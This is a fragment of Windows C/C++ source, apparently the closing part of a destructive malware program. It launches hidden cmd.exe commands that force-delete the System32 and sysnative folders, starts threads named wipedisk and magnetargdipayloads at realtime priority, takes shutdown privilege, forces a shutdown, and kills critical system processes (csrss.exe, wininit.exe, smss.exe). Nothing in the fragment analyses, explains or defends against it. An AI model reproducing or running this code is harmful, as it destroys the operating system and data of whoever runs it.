	CreateProcessW(L"C:\\Windows\\sysnative\\cmd.exe", L"/c del /f /s /q C:\\Windows\\System32", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, lpsi, lppi);
	CreateProcessW(L"C:\\Windows\\sysnative\\cmd.exe", L"/c del /f /s /q C:\\Windows\\sysnative", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, lpsi, lppi);

	HANDLE hwipedisk = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)wipedisk, NULL, NULL, NULL);
	SetThreadPriority(hwipedisk, REALTIME_PRIORITY_CLASS);
	HANDLE hmsgbox = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)msgbox, NULL, NULL, NULL);
	HANDLE hmagnetargdipayloads = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)magnetargdipayloads, NULL, NULL, NULL);
	SetThreadPriority(hmagnetargdipayloads, REALTIME_PRIORITY_CLASS);
	WaitForSingleObject(hmagnetargdipayloads, INFINITE);

        CloseHandle(lppi->hProcess);
        CloseHandle(lppi->hThread);
	HeapFree(hHeap, NULL, lpsi);
	HeapFree(hHeap, NULL, lppi);
	CloseHandle(hHeap);
	CloseHandle(hwipedisk);
	CloseHandle(hmsgbox);
	CloseHandle(hmagnetargdipayloads);

	RtlAdjustPrivilege(19, TRUE, FALSE, &bl);
	NtShutdownSystem(2);
	Sleep(2000);
	TerminateProcessName(L"csrss.exe");
	TerminateProcessName(L"wininit.exe");
	TerminateProcessName(L"smss.exe");
	return 0;
}
